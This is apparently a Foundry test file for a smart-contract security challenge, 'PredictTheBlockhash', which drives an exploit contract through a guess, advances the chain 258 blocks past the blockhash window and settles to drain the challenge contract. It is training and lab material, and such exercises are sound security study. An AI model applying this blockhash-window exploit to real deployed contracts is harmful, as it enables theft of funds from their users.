// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
        vm.deal(address (exploitContract), 1 ether);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // Put your solution here
        exploitContract.guess();
        vm.roll(blockNumber + 258);
        exploitContract.settle();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
